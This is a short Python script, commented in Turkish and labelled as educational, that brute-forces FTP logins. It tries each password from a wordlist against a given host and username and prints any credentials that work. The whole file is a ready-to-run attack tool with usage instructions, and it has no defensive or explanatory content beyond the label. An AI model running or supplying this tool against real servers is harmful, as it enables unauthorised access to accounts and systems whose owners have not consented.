#!/usr/bin/env python3
"""
FTP Brute-Force (Eğitim Amaçlı)
================================
Standart kütüphane kullanır, ekstra kurulum gerektirmez.
"""
import ftplib
import sys
import time

def ftp_bruteforce(target, username, wordlist_path, port=21):
    """FTP brute-force saldırısı"""
    print(f"[*] Hedef    : {target}:{port}")
    print(f"[*] Kullanıcı: {username}")
    print(f"[*] Wordlist : {wordlist_path}")
    print("-" * 50)

    attempts = 0
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue

                attempts += 1
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=5)
                    ftp.login(username, password)
                    print(f"\n[!] PAROLA BULUNDU!")
                    print(f"[+] {username}:{password}")
                    print(f"[+] Deneme sayısı: {attempts}")
                    ftp.quit()
                    return password

                except ftplib.error_perm:
                    print(f"  [{attempts}] Deneniyor: {password:<30} — Başarısız", end="\r")
                except Exception as e:
                    print(f"\n[-] Bağlantı hatası: {e}")
                    time.sleep(2)

                time.sleep(0.3)

    except FileNotFoundError:
        print(f"[-] Wordlist bulunamadı: {wordlist_path}")
        return None

    print(f"\n[-] Parola bulunamadı. Toplam {attempts} deneme yapıldı.")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Kullanım: python FTP_Bruteforce.py <HEDEF_IP> <KULLANICI> <WORDLIST>")
        print("Örnek  : python FTP_Bruteforce.py 192.168.1.100 admin wordlist.txt")
        sys.exit(1)

    ftp_bruteforce(sys.argv[1], sys.argv[2], sys.argv[3])
